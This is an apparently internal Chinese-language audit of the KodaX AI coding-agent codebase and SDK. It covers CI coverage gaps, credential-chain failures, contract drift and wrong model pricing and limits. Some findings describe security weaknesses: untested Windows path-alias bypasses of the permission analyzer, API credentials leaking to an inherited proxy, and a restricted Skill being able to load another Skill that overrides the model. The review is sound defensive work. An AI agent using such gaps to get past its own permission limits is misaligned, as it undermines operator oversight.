# KodaX v0.7.97 全链路审计（含 SDK）

- 审计日期：2026-11-01
- 基线：`KodaX` 分支 HEAD `866d1bdb8`，包版本 `0.7.97-alpha.11`
- 范围：`packages/{llm,agent,coding,repl,artifacts}`、根 `src/`（CLI、Runtime daemon、SDK 门面 `src/sdk-*.ts`）、CI 与发布脚本、`docs/`
- 方法：基线命令自己跑；按维度并行审计（死代码、凭据链、自愈、回归护栏与 CI、契约面、运行时/Host diff、LLM 提示）；每个结论再回到源码核对
- 与 [REVIEW_v0.7.97_FINAL.md](REVIEW_v0.7.97_FINAL.md)（2026-09-08）的关系：本文条目都已在那份文档里检索过，没有重复项
- 本文只读，不改代码，不提交

**标记**

- **VERIFIED**：我在源码或命令输出里亲自确认过，给出 `file:line`
- **SUSPECTED**：机制推理成立，但没有复现，或只由审计代理报告、我未逐行核对
- 优先级：**P0** 会让产品卡死或带安全后果且容易触发；**P1** 有真实故障路径；**P2** 维护成本或潜在风险；**P3** 清理

---

## 0. 结论摘要

分层是干净的，Issue 345-375 的修复也都还在。主要风险不在单个模块，而在"保证机制"本身：

- **回归会在没人看见的地方发生。** CI 的触发频率是刻意限制的，tag 之前的提交不跑检查（2.1，不是缺陷）；真正的问题是 tag 那次也不全跑：约 150 个 Windows 专属护栏从不在 CI 上执行，包括 Issue 371、372 的钉子（2.2）；Issue 345 只有一个不运行的 PTY 脚本护着（2.3）。
- **好几处状态文件坏了不会自己好。** 核心配置写锁、owner 协调锁、迁移残留、执行事实文件，任何一个出问题，用户都只能手动删文件（7.1-7.4）。
- **FEATURE_302 凭据链有两个真实故障路径。** 一个凭据源失败会让所有 Provider 不可用直到重启（3.1）；原生 Anthropic 客户端仍继承环境里的 token 和代理地址（3.2）。
- **统一契约面的同一事实写在多处、没有一致性测试。** `kodaxRuntimeContracts` 没有读者且已漂移（4.1），能力版本号手抄 5-7 处（4.2），已退役能力仍出现在文档和模型自我知识里（4.3），测试 helper 随 SDK 公开（4.4）。
- **alpha.10 以来的改动没有高优先级回归**，但 spill 出来的工具输出不再有任何生产清理（5.1）。
- **模型元数据和自我知识有用户能看到的错误。** 默认 OpenAI 会话永远不显示成本（6.1）；Anthropic 默认模型按 200K 做预算，实际是 1M，压缩过早触发；几处价格与官方差 20% 到 12 倍（6.2）；Skill 的 `haiku`、`opus` 别名指向已退役模型（6.3）；手册说 DeepSeek 不能看图（6.5）；提示词让模型调用一个不存在的工具（6.6）。这些事实都没有一致性测试守着（6.10）。
- **可清理的体量不小。** repl 里第二份 Ink fork 约 4.9k 行不可达（9.1），另有一批无调用者的符号和过期兼容窗口（9.3-9.5）；`KNOWN_ISSUES.md` 已超过 1 MB（10.1）。

建议先从 tag 时的 Windows 覆盖和 Issue 345 的测试补起（第 12 节第 1 步），再修会卡死的自愈缺口和凭据链。

---

## 1. 验证基线与覆盖局限

### 1.1 本次实际运行的检查

| 检查 | 结果 | 备注 |
|---|---|---|
| `tsc -p tsconfig.check.json` | 通过，4.4s | 只覆盖根 `src/**/*.ts`（排除测试），对照各包已构建的 `dist/*.d.ts` |
| `tsc -p tsconfig.test.json` | 通过，17.2s | 覆盖 `src` 的 229 个测试，但包内 1,002 个测试文件只列入 17 个，`tests/*.test.ts` 111 个只列入 50 个 |
| `test:fast` | 通过，13m14s | 文件 339 过 / 6 跳过（共 345），用例 3274 过 / 52 跳过（共 3326）；其中 import 阶段 362s |
| `npm ls` | 正常 | 只有平台可选依赖未满足；5 个包都在 `0.7.97-alpha.11`；无 pnpm 残留 |

没有跑 unit、system、contract、integration、eval 层，也没有跑真实沙箱与打包门禁。下文关于这些层的结论来自静态阅读和 GitHub Actions 运行记录。

### 1.2 覆盖局限（本身就是发现）

- **大部分测试不做类型检查。VERIFIED。** vitest 只剥类型不检查；包的 tsconfig 排除 `**/*.test.ts`；`tsconfig.test.json` 只挑了少数文件。Mock 与真实契约漂移时测试照样通过。`benchmark/` 与 `examples/` 完全不做类型检查。
- **没有任何 linter。VERIFIED。** 仓库没有 ESLint / Biome 配置，`package.json` 里也没有 eslint。CLAUDE.md 的"禁止 `any`、禁止静默吞错、禁止 `console.log`"全靠人工。实际残留的真 `any` 不多（约 5 处，如 `packages/repl/src/.../memory-diagnostics.ts:366`），但代码里的 `eslint-disable` 注释都是无效的。
- **fast 层偏慢。** 13 分钟里 6 分钟花在模块导入上，作为"本地快速回归"已经偏离设计目的。

---

## 2. 回归风险：CI 与回归护栏

### 2.1 刻意设计：CI 只在打 tag 或手动触发时运行

不是缺陷。项目此前明确要求减少 CI 触发次数，所以 push 和 PR 不跑检查是取舍，不是遗漏。需要知道的是这个取舍的代价：

- `.github/workflows/ci.yml:13-15` 只有 `workflow_call` 和 `workflow_dispatch`；`release.yml:10-14` 只在推 `v*` tag 时调用它。
- HEAD 比最后一次通过 CI 的提交 `0f3930e95` 多 50 个提交。这些提交从未在 CI 上跑过。
- 失败只在发布当天暴露。审计代理从 Actions 记录看到 `v0.7.97-alpha.11` tag 在通过前被强推到 8 个不同提交上（SUSPECTED，我没有逐条核对 run 记录）。
- `scripts/release.mjs` 在 `npm publish` 前只校验 tarball 的 sha256 和 sidecar 审计，不重跑测试。
- 因此下面 2.2 的 Windows 覆盖缺口尤其重要：它是 tag 时唯一会跑的机会，而现有的 Windows job 并没有覆盖那 150 个用例。

### 2.2 P0：约 150 个 Windows 专属用例从不在 CI 上执行。VERIFIED

unit、system 层只在 Ubuntu 上跑。Windows job 只跑显式列出的文件（`ci.yml:352-366` 等）和 `-t` 过滤，下面这些 `describe.runIf(win32)` / `it.runIf(win32)` 用例所在文件都不在列表里：

| 护栏 | 位置 | 保护的问题 |
|---|---|---|
| managed-child 缓存 | `managed-child-processes.cache.test.ts:21`（整个块），`:134` 钉住 16973a93 | Issue 371 |
| Windows v2 账号切换 | `sandbox-runtime.test.ts:2178-4827`（约 75 例），`:4175` | Issue 372 的 TS 一半（Rust 一半 `acl.rs:2714` 在 `test:native` 里跑） |
| 重新启用的 Git 用例 | `sandbox-runtime.test.ts:1936/2041/2071` | 27bb8536e 从 `it.skip` 改成 `runIf(win32)`，但仍然只在本机跑 |
| Win32 路径别名安全护栏 | `permission-analyzer.test.ts`（16 处）、`absolute-denylist.test.ts:223,523`、`exec-policy.test.ts`、`permission.test.ts`、`repl-bash-signals.test.ts:97-160` | `\\?\`、8.3 短名等绕过 |
| 凭据与 ACL | `auth-file.test.ts:157`、`oauth-session-store.test.ts:35,44`、`provider-oauth-store.test.ts:24` | 凭据文件权限 |
| 其他 | `state.windows.test.ts:84`（Issue 338）、`windows-native-artifacts.test.ts` 的 12 例（Issue 317/319）、`kodax_cli.daemon-smoke.test.ts:1337,1557,1585`、`worktree.test.ts` 等 | — |

后果：有人回退 `managed-child-processes.ts:1186` 的修复，或弄坏权限分析器的别名识别，Linux 上这些用例被跳过，Windows job 不加载它们，发布全绿。27bb8536e 提交说明里的"18813 passed, 73 gated skips"来自本机 Windows，不是 CI。

### 2.3 P1：部分已修问题只有手工脚本护栏。VERIFIED

- **Issue 345**：唯一防线是 `packages/repl/src/ui/utils/transcript-input-policy.ts:126` 的 `!options.isBrowsingHistory` 条件。没有任何测试文件提到 `isBrowsingHistory`。只有 `tests/repl-pty-acceptance.mjs` 覆盖它，而没有 workflow 运行这个脚本。回退修复，CI 照样通过。
- **Issue 350、352** 部分如此：实时保留检查只在 `repl-history-browse-acceptance.mjs`；352 的命令回显走 `appendNotice` 只由 PTY 脚本检查。
- **Issue 369、370** 的真实双终端和 Windows 300 次滚轮复现都是不运行的独立脚本；底层逻辑有单测。

### 2.4 P2：从不运行的测试与无人设置的环境门。VERIFIED

- `tests/bundled-artifacts.test.mjs`、`tests/repl-fixture-daemon.test.mjs` 没有任何脚本或 workflow 引用。
- `KODAX_ARTIFACT_TEST_BROWSER` 从不设置，`browser-formats.test.ts:10-73`、`pdf-render.test.ts:21`、`render.test.ts:9` 全部跳过，Artifact 渲染在 CI 中没有测试。
- `tests/sa-refactor-goldens/selection.test.ts:263-266` 依赖真实 `~/.kodax/sessions`，CI 中永远跳过。
- integration、eval、`test:repl-pty:built` 层从不运行；`repl-pty-acceptance` 等验收脚本中只有 `windows-sdk-attach-pressure.mjs` 接入了 CI。
- macOS 只跑 native、POSIX shell 和 bundle 门禁，没有 unit 层。
- `tests/asrt-wfp-probe.test.mjs:81` 仍断言端口数精确相等，vitest 侧已在 11e1ce086 放宽。最近 25 次运行没有因此失败，属理论风险。

### 2.5 已修问题的保留情况

Issue 345-375 的修复代码都还在，没有被回退。表中"CI 运行"指钉住该修复的测试是否在 CI 中执行。

| Issue | 修复位置 | 钉住它的测试 | CI 运行 |
|---|---|---|---|
| 345 | `transcript-input-policy.ts:126` | 无（只有 PTY 脚本） | **否** |
| 346 | `prompt-history-browse.ts:103` | `usePromptHistoryBrowse.test.tsx:78` | 是 |
| 347 | `session-view.ts:424-426` | `sdk-client.history-boundaries.test.ts:102-160` | 是 |
| 348 | `restore-history.ts:203-331` | `session-view.output-ownership.test.ts` | 是 |
| 349 | `sanitize.ts:139` | `llm-adapter-output.test.ts:56` | 是 |
| 350 / 352 | 浏览 hook / notice 路由 | 部分单测 + 不运行的脚本 | 部分 |
| 351、354、355、358、359、361-365、367-370、373-375 | 见各 Issue | 对应单测 | 是 |
| 371 | `managed-child-processes.ts:1186`、`process-tree.ts:747,1026` | `managed-child-processes.cache.test.ts:134` | **否** |
| 372 | `sandbox-runtime.ts` + `acl.rs` | TS `sandbox-runtime.test.ts:4175`；Rust `acl.rs:2714` | TS **否**，Rust 是 |

Open 状态：371 和 353 应保持 Open。353 的守卫 `run-manager.ts:397` 早于报告存在，后续只有 aff525eb1 把测试夹具挪开了竞态，没有测试断言已完成 run 的投影（SUSPECTED：脚本结束后的短窗口内状态仍显示 running）。

**建议**：不增加触发频率（2.1 是刻意取舍）；把 tag 那次运行的 Windows job 改为跑包含 `runIf(win32)` 的所有文件，或给 unit 层加 Windows 矩阵；把 Issue 345 的条件补成单测。

---

## 3. 回归风险：Provider 凭据链（FEATURE_302）

### 3.1 P1：一个凭据源失败会让所有 Provider 永久不可用。VERIFIED

- `src/kodax_cli.ts:4637-4640` 用 `cliCredentials ??= createCliProviderCredentials(config)` 缓存 promise。它一旦 reject，之后每次授权都拿到同一个 rejected promise，直到进程重启。
- `src/cli-provider-credentials.ts:1-45` 在 `store.initialize()` 之后串行地对每个 OAuth 自定义 Provider 执行 `migrateProviderOAuthRegistration` 和 `openOAuthSession`，没有按来源隔离。
- 场景：一个 OAuth Provider 的会话文件损坏或刷新失败，用户连普通 API key 的 Provider 都用不了。
- 测试只覆盖 unlinked 场景（`cli-provider-credentials.test.ts:36`）。
- **建议**：失败时清空缓存；每个来源单独 catch，把失败记为该 Provider 的诊断。

### 3.2 P1：原生 Anthropic Provider 仍会继承环境里的 token 与代理地址。VERIFIED

- 2026-10-01 的 f2cb876bf 只修了 compat 路径（`packages/llm/src/providers/anthropic.ts:304` 设 `authToken: null`）。
- 原生路径 `packages/llm/src/providers/registry.ts:201` 只传 `apiKey`；`createAnthropicSdkClient`（`anthropic.ts:66-71`）把 options 原样展开，不默认 `authToken: null`，也不固定 `baseURL`。SDK 因此会读 `ANTHROPIC_AUTH_TOKEN` 和 `ANTHROPIC_BASE_URL`。
- 场景：在 Claude Code、编辑器等设置了这两个变量的终端里启动 KodaX，保存在 `auth.json` 的 Anthropic key 会连同继承的 Bearer token 一起发往继承的代理地址。
- SUSPECTED：OpenAI SDK 同样会读 `OPENAI_BASE_URL`、`OPENAI_ORG_ID`、`OPENAI_PROJECT_ID`。
- **建议**：在 `createAnthropicSdkClient` 统一默认 `authToken: null` 和显式 `baseURL`；OpenAI 侧同理；加一个设置了这些变量的客户端构造测试。

### 3.3 P2：其他凭据链风险

| 风险 | 状态 | 位置 |
|---|---|---|
| CLI 与 daemon 环境不同，连接指纹漂移，报 "Provider credential connection is not approved" | SUSPECTED | `provider-credential-authorizer.ts:76`；`operations/request.ts` 读 `process.env` |
| OAuth / 云 token 刷新会轮换 replay 身份；Vertex 上同一 run 的工具调用按文本重放，Google 缓存失效 | SUSPECTED | `credential-fingerprint.ts:3-5`、`cloud-auth.ts:12-15`、`google-messages.ts:30,39-49` |
| Anthropic OAuth 的 thinking signature 是空串 | SUSPECTED | `anthropic.ts:1661-1672` |
| 保留的 sealed OAuth 备份带着过期 refresh token | SUSPECTED | `provider-oauth-store.ts:34-39` |
| 降级风险：alpha.11 忽略 `auth.json`；自定义 Provider 用 google/bedrock/mistral/pi-messages 协议时，alpha.11 CLI 启动即报 "Unknown protocol"；`auth-file.ts:46-66` 校验严格，未知字段即拒绝 | SUSPECTED | — |
| 刷新 token 与落盘之间崩溃需重新登录；OAuth 锁等待约 30s；401 不触发强制刷新；配额错误仍可触发子进程 fallback；`x-should-retry` 无测试 | SUSPECTED，低 | — |

已确认健全：重试上限（≤3 次）、非幂等请求不重试、`redirect: 'error'`、头注入拦截、日志脱敏、Issue 331 未回归、跨进程 OAuth 刷新串行化、`auth.json` 原子 CAS 写入。

---

## 4. 统一契约面与 SDK 漂移

包之间的分层是干净的：llm 不依赖 agent/coding/repl，agent 不依赖 coding/repl，coding 不依赖 repl，任何包都不导入根 `src/`。问题集中在"同一事实写在多处、没有一致性测试"。

### 4.1 P1：`kodaxRuntimeContracts` 没有读者，且已与代码不一致。VERIFIED

- 根 `package.json:11-20`。在 `src/`、`packages/*/src`、`scripts/`、`tests/`、`.github/` 里检索，读者数为 0。它在 v0.7.78（`2f61969e4`）加入后从未被读过。
- 内容已漂移：它有 `integrationConfigResilience`，`KODAX_RUNTIME_SDK_CAPABILITIES`（`src/sdk-runtime.ts:1008-1023`）没有；后者有 `runtimeEventCoalescing`、`sandboxRuntime`、`conversationHistory` 等，它没有。
- 场景：把 `runtimeAutoModeGuardrail` 升到 7，tarball 和 Space 仍从 `package.json` 读到 6，没有测试失败。
- **建议**：删除，或由常量生成并加不一致即失败的测试。

### 4.2 P1：能力版本号手抄 5-7 处，没有跨副本一致性测试。VERIFIED

- `runtimeAutoModeGuardrail: 6` 出现在 daemon 广告 `src/runtime-daemon/server.ts:2755`、内嵌广告 `src/sdk-runtime.ts:4399`、SDK 常量 `:1018`、`createKodaXRuntime` 需求 `:4208`、`daemonCapabilityRequirements` `:6067`、需求类型联合 `:1094`、`package.json`。
- `sandboxRuntime: 11` 出现在 `src/sandbox-runtime.ts:443` 和 `sdk-runtime.ts:1019/4218/6069`。
- 子字段也重复，如 `retryClassifierTimeoutMs: 180_000`（`server.ts:2764`、`sdk-runtime.ts:4408`），没有绑定 `DEFAULT_CLASSIFIER_RETRY_TIMEOUT_MS`（`packages/coding/src/guardrails/auto-mode/classify.ts:130`）。
- 每个副本各自用字面量测试钉住（`server.test.ts:2182`、`sdk-runtime.test.ts:334`），副本之间无人比较。
- 场景：只升 daemon 广告、忘了需求副本，新 SDK 继续接受旧 daemon；反过来则所有 daemon 都被以 `daemon_capability_upgrade_required` 拒绝。
- `createKodaXRuntime` 只在 win32 且 autoStart 时要求 `sandboxRuntime: 11`（`:4215-4219`），`daemonCapabilityRequirements` 在 win32 总是要求（`:6069`）。两者合并后结果一致，但同一规则写成两种形状（SUSPECTED 无害）。

### 4.3 P1：已退役的 `runtimeExitSettlement:2` 仍被描述为现行能力。VERIFIED

- `02631b4f5`（2026-09-07）删除了该能力和 `settleKodaXRuntimeExit`。
- 文档仍把它列为现行下限：`docs/ADR.md`（3 处）、`README.md`（3 处）、`docs/PRD.md`、`docs/release.md` 多个版本块。
- Agent 的自我知识 `packages/coding/src/self-knowledge/manual-topics.json`（3 处）也这样说，和同文件里的退役说明矛盾。
- `packages/coding/src/self-knowledge/registry.test.ts:115,139,343` 钉住了这段过期文本，测试反而锁定了漂移。
- 场景：用户问 `/manual sdk`，模型告诉他这个能力存在；嵌入方写 `requirements: { runtimeExitSettlement: 2 }` 则类型检查失败。

### 4.4 P1：测试专用 helper 随公共 SDK 发布。VERIFIED

- SDK 入口用 `export *` 再导出整个包，于是这些符号进入公共子路径：
  - 根与 `/coding`：`_resetRuntimeForTesting`（`packages/coding/src/index.ts:1260`）
  - `/agent`：`_resetMessageQueueForTests`、`_resetActiveRootQueueRoutesForTests`（`packages/agent/src/index.ts:509-510`）、`_resetPresetDispatchers`（`:227`）、`_resetInvariantRegistry`（`:312`）、`_resetAdmittedAgentBindings`（`:335`）、`_resetAdmissionMetrics`（`:340`）等
  - `/repl`：`_resetQueuedPromptsCacheForTests`、`resetTmuxControlModeProbeForTesting`
- 场景：嵌入方调用某个 reset，清空了一个活着的 Runtime 的进程级注册表或消息队列。
- **建议**：移到 `/testing` 子路径，或从 barrel 中去掉，并加每个子路径的 `.d.ts` 导出清单快照。

### 4.5 P2：版本精确匹配会拒绝更新的 Host。VERIFIED

- `src/client-runtime-adapter.ts:26` 和 `:47` 要求 `productExecutionProfile.version === 2`，不是 `>= 2`。未来的 v3 Host 会被报 `daemon_upgrade_required`。现成的 `>=` helper `assertVersionedRuntimeCapability`（`sdk-runtime.ts:5887`）没有用上。
- daemon 只在 `=== 1` 时透传 owner 能力（`server.ts:2711-2729`，涵盖 `productClient`、`sessionDrafts`、`productExitControl` 等）。把内嵌的 `productExitControl` 升到 2 而忘改 `server.ts`，daemon 就什么都不广告，所有新客户端被拒。

### 4.6 P2：没有测试能发现公共 API 的意外变化。VERIFIED（审计代理用 TypeScript checker 遍历新构建的 `dist/*.d.ts`）

- `packages/agent/src/public-entrypoints.test.ts` 只检查 5 个函数存在；`src/sdk-independence.test.ts:57-73` 只检查子路径键存在；`tests/fixtures/product-client-types/consumer.ts` 只编译 `/client` 的固定子集。
- SDK 入口清单手写在三处，互不校验：`package.json` 的 `exports`、`scripts/build-dts.mjs:85-100`、`scripts/build-bundle.mjs:470`。`build-dts.mjs:19-31` 的注释还写着 11 个输出，实际是 14 个。
- `sdk-client.d.ts` 引用了 53 个未导出的第一方类型，`sdk-runtime.d.ts` 引用了 168 个。例如 `ClientAutoModeStats.denials` / `.breaker` 用的是内部的 `DenialTracker` / `CircuitBreaker`（`packages/coding/src/client-contract.ts:1160-1161`），`ClientRunOutcome.result` 是 `KodaXResult`（`:912`）。Space 无法从 `/client` 命名这些类型；改动 coding 的 guardrail 内部类型会悄悄改变"纯数据"产品契约。

### 4.7 P2：词表与错误码手抄多处。VERIFIED

- daemon 诊断与生命周期错误码同时定义在 `src/runtime-daemon/schema.ts:1508-1537` 和 `src/sdk-runtime.ts:1517-1527`、`:2314-2318`。server 会按 schema 校验自己的结果（`server.ts:3830`）。只在 TS 联合里加码，`sessions.diagnostics` 和 `runs.read` 就返回 `internal_error`。只有部分 enum 用 `satisfies` 绑定（如 `schema.ts:1628`）。
- `daemon_upgrade_required` 是裸字符串，在 `src/runtime-daemon/client.ts` 里内联约 10 处，`client-runtime-adapter.ts:27,48` 两处，REPL 用字面量匹配（`packages/repl/src/commands/workflow-command-live.ts:560`）。另一个同义码 `daemon_capability_upgrade_required`（`sdk-runtime.ts:492`）。两者都不在 `RuntimeDaemonErrorCode`（`protocol.ts:299-324`）里。
- `workMode` / `agentMode` 已有 `KodaXWorkMode`（`packages/coding/src/types.ts:2181`），仍在 `client-contract.ts:837,1002`、`execution-profile-contract.ts:6-7`、`sdk-runtime.ts:18245,22267`、`schema.ts:1489` 重写。权限模式字面量散在 5 处。`sharedSessionSettings.keys` 在 `server.ts:2864-2876` 和 `sdk-runtime.ts:4422-4434` 各一份，客户端按它门控（`runtime-daemon/client.ts:2478`）。
- `src/recovering-runtime-client.ts:25` 硬编码 `'protocol_closed'` 和 `'transport_error'`，没有用 `RuntimeDaemonDisconnectCode` 或已导出的 `isRuntimeDaemonDisconnectError`。

### 4.8 P2：文档与代码不符

| 文档 | 问题 | 状态 |
|---|---|---|
| `docs/SDK_MIGRATION.md:364` | 写 `CostRecord.cost`，实际是 `TokenUsageRecord.cost`（`packages/llm/src/cost-tracker.ts:13,22`） | VERIFIED |
| `public_docs/sdk/embedder-guide.md:1861` | 从 `@kodax-ai/kodax` 导入 `listConstructedAgents`，任何子路径都不导出它 | VERIFIED |
| `public_docs/sdk/embedder-guide.md:1642` | 从 `/coding` 导入 `SessionData`，它只从 `/repl` 导出 | VERIFIED |
| `CLIENT_CONTRACT.md:5`、`SDK_MIGRATION.md:135` | 声称核对于 `b70d2d30`（2026-10-29），已落后 HEAD 69 个提交 | VERIFIED |
| `examples/embedded-agent.ts:26`、`examples/otel-export.ts:24-33` | 导入未发布的私有包 `@kodax-ai/coding`、`@kodax-ai/agent`；应改为 `@kodax-ai/kodax/coding`、`/agent` | VERIFIED |

两份契约文档的其余主张基本成立：`CLIENT_CONTRACT.md` 的 24 个 `domain.method` 中 22 个存在于 `KodaXProductClient`，另 2 个正确标注为可信 Runtime 方法；20 个相对链接都能解析。

### 4.9 P2：FEATURE_302 没有 ADR / HLD / DD 覆盖，并改变了 ADR-068 的凭据存储决策。VERIFIED

- `docs/HLD.md`、`docs/DD.md`、`docs/ADR.md` 中 FEATURE_302、Responses transport、Bedrock、Vertex、Mistral、provider parity 出现次数都是 0。HLD/DD 的"最后更新"仍写 FEATURE_298/299/301。
- 编号 ADR 停在 ADR-070（v0.7.96-alpha.4），`ADR.md` 顶部三个十月下旬的条目没有编号。
- ADR-068（`docs/ADR.md:6512`）规定 Space 把 Provider 密钥放进系统钥匙串；`docs/LLM_INTEGRATION.md:81` 却说 `providerOAuthStore` 现在把 OAuth 写进共享 `auth.json`，新登录不再需要 DPAPI 或钥匙串。没有 ADR 取代 ADR-068。
- `createEncryptedOAuthSessionStore`、`createWindowsOAuthSessionStore` 从 `/runtime` 导出（`src/sdk-runtime-public.ts`），没有任何文档提到。
- `docs/FEATURE_LIST.md:528` 把 FEATURE_302 的目标版本写成 v0.7.99，包版本是 0.7.97-alpha.11。

### 4.10 P3：包内目录级循环依赖。VERIFIED（值导入，排除包根文件）

- coding：16 个目录构成一个环（tools、permissions、extensions、agent-runtime、prompts、task-engine 等），例如 `permissions/permission.ts → tools/registry.js` 与 `tools/undo.ts → permissions/agent-home-policy.js`。
- repl：6 个目录（session、tui、common、ui、interactive、commands）。
- llm：3 个目录（`cloud/google-cache.ts → providers/cloud-auth.js`，`providers/custom-provider.ts → cloud/provider-config.js`）。
- agent：无。
- 这和 CLAUDE.md"禁止循环依赖"冲突，但目前没有引发初始化顺序故障，优先级低。

---

## 5. 回归风险：alpha.10 以来的运行时、coding 与 Host 改动

范围：`v0.7.97-alpha.10..HEAD`，316 个源文件，+14,610 / −5,528 行。改动最多的目录：`coding/self-knowledge` 3987 行、`llm/providers` 3487、`coding/tools` 1382、`coding/agent-runtime` 1382、`coding/task-engine` 1063、`src/sdk-runtime.ts` 512。

没有发现高优先级回归。下面这些多数是偏安全侧的行为变化，但大多没有测试。

### 5.1 P1：spill 出来的工具输出不再有任何生产清理。VERIFIED

- alpha.10 时唯一的生产调用在 `packages/repl/src/session/public-api.ts:302`（`void maybeRunReferenceAwareToolOutputGc(...)`）。84922d76d（2026-10-28）删除了它。
- 现在 `maybeRunReferenceAwareToolOutputGc` 和 `maybeRunToolOutputGc`（`packages/coding/src/tools/tool-output-gc.ts:179,207`）只剩 barrel 导出，没有生产调用者；`src/`、repl、agent 里也没有别的清理 `tool-results` 的代码。
- 删除旧调度本身是对的：一个 manager 可能删掉另一个 sessions 根仍在引用的输出（`tool-output-retention.test.ts:52`）。但没有任何东西接手。`docs/features/v0.7.40.md:423` 说它供 Host/operator 显式调用，而 Host 并不调用。
- 场景：长期运行的 Host 或 SDK 用户，每个大 bash / MCP / read 输出和 bash 恢复清单都永久留在 `~/.kodax/tool-results`（`truncate.ts:254`），磁盘无界增长。这正是 v0.7.40 加 GC 的原因。
- **建议**：由 Host daemon 对它拥有的全部 sessions 根做一次引用感知的定期清理，并加 Host 级测试。

### 5.2 P2：Skill 相关的两处行为变化（0d723c6ea）

- **显式工具调用带策略的 Skill 现在失败。** 代码路径 VERIFIED，可达性 SUSPECTED。`runToolInvocation` 经 `host-invocation.ts:51` 只复制 `options.context.activateModelSkill`，而这个函数只由 `applyRuntimeSkillInvocationPolicy` 安装。`src/sdk-runtime.ts:11370` 和 `src/client-runtime-adapter.ts:197-200`（`runs.startTool`）直接调用 `runToolInvocation`。客户端 `startTool({ name: 'skill', input: { skill: 'x' } })`，x 声明了 allowed-tools / hooks / model / agent 时，得到 `[Tool Error] skill x: runtime Skill activation is unavailable.`（`packages/coding/src/tools/skill.ts:87`）。这是 fail-closed（alpha.10 在这条路径上静默不执行策略），但属于未公告的行为变化，没有测试覆盖。
- **`skill` 工具豁免 allowed-tools。** VERIFIED，有意放宽。`packages/coding/src/skill-invocation-policy.ts:549` 的 `tool !== 'skill'`。Skill A 声明 `allowed-tools: Read` 后，模型仍可加载 Skill B，B 的指令、hooks 和 `model` 覆盖会进入本次 run。B 的具体工具调用仍受 A 检查（`activeEvents` 串联），动态 `!cmd` 也按所有叠加策略检查。失去的是作者"受限 Skill 不能拉入其他 Skill、不能换模型"的预期。缺一个测试：只读 Skill 加载允许 Bash 的 Skill 后，bash 仍被拦截。

### 5.3 P3：其他行为变化

| 变化 | 位置 | 状态 |
|---|---|---|
| 请求 effort 与实际发送不同、但没有 fallback 记录时，不再提示（866d1bdb8 本意只静默 profile 和 cached-rejection） | `src/session-view-notices.ts:25-27` | VERIFIED |
| 配置文件里的 `agentMode: "sa"` 被静默改成 AMA，而命令行 `--agent-mode sa` 会报错 | `src/cli_option_helpers.ts:293-304`（`_config` 未使用） | VERIFIED |
| daemon 客户端拒绝客户端发送的 `timeout` 答复，旧客户端会收到 `invalid_input` | `src/runtime-daemon/client.ts:457` | VERIFIED |
| 工具派发先过 `isToolDiscoverable`，历史里调用未激活工具的模型得到 "Tool is not active in the current runtime."，不再是工具自己的诊断 | `packages/coding/src/agent-runtime/tool-dispatch.ts:218` | VERIFIED，fail-closed |
| executor 注册指纹从 v8 `serialize` 改为 `JSON.stringify`；Map/Set 字段会序列化成 `{}`，只差在 Map/Set 的两次注册得到相同指纹 | `packages/agent/src/external-agents/executor-plane.ts:398-401` | VERIFIED，仅当注册含非 JSON 值 |
| win32 上不在 Job 中时，每条 bash 和 shell 探测多启动一个 node gate 进程；被信号杀死的目标报退出码 1 | `packages/agent/src/runtime/windows-managed-process.ts`、`bash.ts:1006` | SUSPECTED；相关测试全是 `runIf(win32)`，见 2.2 |
| run 被 fence 或进入终态后，外部 `onEffectiveConfig` 回调也被抑制 | `src/sdk-runtime.ts` | SUSPECTED |
| win32 上没有启动身份的 managed-child 记录永远无法确认，改为隔离而非清扫，会累积 | `managed-child-processes.ts` | SUSPECTED |

审计代理确认健全的部分：auto-mode guardrail 覆盖 SA、AMA、Script cell 和 host 工具调用；Skill 模型选择在 SA 与 AMA 都已绑定；工具结果预算与恢复投影；Script cell 的取消与超时结算；子 Agent 继承父级 `excludeTools`；Ink 与 classic REPL 的单写者（`hostOwnsWrites`）；owner 策略切换 fail-closed；`mergeExtensionRuntimeContracts` 参数对调修复了 `host:` 能力路由。没有深入看的：`src/sdk-runtime-public.ts` 新增的 322 行、`state.cutover.test.ts`。

---

## 6. LLM 面向内容（提示词、工具描述、自我知识）

范围：模型直接读的文本，以及决定上下文预算和成本显示的模型元数据。alpha.10 之后，三份文本从 TS 字符串抽成了数据文件：`packages/coding/src/self-knowledge/manual-topics.json`（下称"手册"，+2168 行，3b7a8f8f2）、`packages/coding/src/prompts/static-text.json`（+323 行，e6247c3a5）、`packages/coding/src/tools/managed-tool-text.ts`（+127 行，a349eabb9）。模型元数据在 `packages/llm/src/providers/provider-capabilities.json`（下称"能力表"）和 `packages/llm/src/cost-rates.ts`（下称"费率表"）。

官方价格与上限按 Anthropic 当前模型表和 OpenAI 官方价格页核对（2026-11-01）。

### 6.1 P1：OpenAI 默认模型和几条 Kimi、Zhipu 路由没有费率，整个会话的成本显示为未知。VERIFIED

- `getCostRate`（`cost-rates.ts:219-229`）只按 provider + model 精确查表，没有回退。`cost-tracker.ts:182,209` 只要有一次调用没有费率，就把整个会话的 `totalCost` 置为 `null`。
- 用脚本逐个 Provider 比对能力表的默认模型和 `models[]` 与费率表，缺失的有：
  - `openai` 的默认模型 `gpt-5.3-codex`（能力表:132）。费率表里只有 `gpt-5.4` 和 `gpt-5.3-codex-spark`（`cost-rates.ts:61-62`）。所以默认配置下的 OpenAI 会话永远不显示成本。
  - `kimi` 的 `kimi-k3.1-pro`、`kimi-k3.1-pro-highspeed`；`kimi-code` 的 `k3.1-pro`、`k3.1-pro-highspeed`。
  - `zhipu` 的 `glm-5.2`。
- 审计代理说 K3.1 和 GLM-5.2"没有费率"，这说过头了。`ark-coding` 等路由有它们的费率（`cost-rates.ts:197,202`），缺的只是上面这几条路由。
- **建议**：加一个一致性测试，要求每个 Provider 的默认模型和 `models[]` 都有费率，或者显式标记为不计费。

### 6.2 P1：多个模型的上下文、输出上限和价格与官方不符。VERIFIED

| 模型 | 代码里 | 官方 | 后果 |
|---|---|---|---|
| `claude-sonnet-4-6`（Anthropic 默认）、`claude-opus-4-6` | 没有模型级上限，继承 Provider 级的 200K / 64K（能力表:124-125） | 1M / 128K | 压缩阈值 75%（`session-lineage/compaction/policy.ts:3`）在约 150K 处触发，而不是约 750K；输出被截在 64K |
| `claude-haiku-4-5` | 0.80 / 4.00，缓存读 0.08，写 1.00（`cost-rates.ts:52-58`） | 1.00 / 5.00，缓存读 0.10，写 1.25 | 成本少报约 20%；`cost-rates.test.ts:120` 把旧值钉住了 |
| `claude-sonnet-4-6` 缓存读 | 0.375（`cost-rates.ts:48-49`） | 0.30（输入价的 0.1 倍） | 缓存读多报 25% |
